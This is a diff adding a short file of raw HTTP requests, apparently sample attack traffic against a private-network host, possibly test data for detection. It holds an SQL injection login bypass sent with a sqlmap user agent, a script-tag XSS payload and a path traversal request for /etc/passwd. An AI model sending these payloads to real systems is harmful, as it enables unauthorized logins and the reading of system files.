@@ -1,0 +1,12 @@
+GET /login?username=admin' OR '1'='1&password=123456 HTTP/1.1
+Host: 192.168.1.100
+User-Agent: sqlmap/1.6.3#stable (http://sqlmap.org)
+
+POST /search HTTP/1.1
+Host: 192.168.1.100
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Content: q=<script>alert('XSS')</script>
+
+GET /admin/config.php?file=../../../../etc/passwd HTTP/1.1
+Host: 192.168.1.100
+User-Agent: curl/7.68.0
